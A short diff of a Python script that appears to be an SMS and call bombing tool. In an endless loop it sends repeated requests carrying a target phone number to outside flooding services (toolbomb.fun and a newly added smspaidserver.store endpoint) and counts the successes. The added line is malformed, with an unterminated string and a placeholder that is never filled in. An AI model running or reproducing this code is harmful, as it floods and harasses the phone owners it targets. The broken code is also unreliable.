@@ -100,8 +100,7 @@ def MyApp():
             count[JK]["failed"] = 0
         while True:
             u=requests.get("https://api.toolbomb.fun/call.php?number={JK}&key=Madhav")
-            url=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
-            urll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""})
+            url=requests.get("https://smspaidserver.store/Api/Wser.php?number={JK}
             urlll=requests.post(f"http://toolbomb.fun/Sms-bomber/", data={"number": JK, "key": "@Toolbomb", "sub": ""}).status_code
             if urlll == 200:
                 count[JK]["successful"] += 1
